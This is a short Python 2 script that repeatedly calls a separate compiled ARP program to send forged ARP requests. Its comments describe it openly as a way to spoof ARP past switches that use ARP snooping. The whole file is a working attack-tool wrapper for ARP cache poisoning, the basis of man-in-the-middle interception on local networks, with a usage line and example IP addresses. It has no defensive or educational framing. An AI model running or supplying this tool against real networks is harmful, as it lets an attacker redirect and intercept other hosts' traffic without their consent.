#!/usr/bin/python
import sys, time, re, threading
from executable import Executable

'''
	Sends an ARP Request given a source ip, source hw address and a target ip.
	Disregards the reply. Use to spoof arp for hosts with arp snooping on.
	If you use the same target ip and source ip, this looping program will
	be making gratuitous arp broadcasts.
'''
class ArpLoop(Executable):	
	arp_executable = "../bin/arp"
	arp_delay = 5
	
	def __init__(self, network_interface, src_ip, target_ip):
		Executable.__init__(self, self.arp_executable)
		self.network_interface = network_interface
		self.src_ip = src_ip
		self.target_ip = target_ip
		print "# Setting up loop for arp spoofing " + target_ip + " (with " + src_ip + " on " + network_interface + ") "
		
	def start(self):
		print "# Starting spoof. " + self.src_ip + " is now spoofing " + self.target_ip
		self.shouldStop = False
		i = 0
		while not self.shouldStop:
			self.execute(self.network_interface, self.target_ip, self.src_ip,)
			i += 1
			print "#"+str(i)			
			delay = 0
			while delay < self.arp_delay and not self.shouldStop:
				time.sleep(0.01)
				delay += 0.01
		
	def stop(self):
		self.shouldStop = True
				
		
def main(argv):	
	if(len(argv) < 4):
		print "USAGE: arp-loop.py <interface> <src_ip> <target_ip>"
		print "Example: arp-loop.py eth0 192.168.1.67 192.168.1.82"
		print 		
		exit()
	
	try:
		arlp = ArpLoop(argv[1],argv[2],argv[3])
	except IOError:	
		print "Missing C program to ping with. Make sure you've built the raw socket programs."
		exit(1)
	
	try:
		t = threading.Thread(target=arlp.start)
		t.deamon = True
		t.start()
		while True:
			time.sleep(1000) # lets not eat up unnecessary processing..
			pass
	except KeyboardInterrupt:
		arlp.stop()
	
	print "\nDone."
	
		

if __name__ == '__main__':
	main(sys.argv)
		
		
		

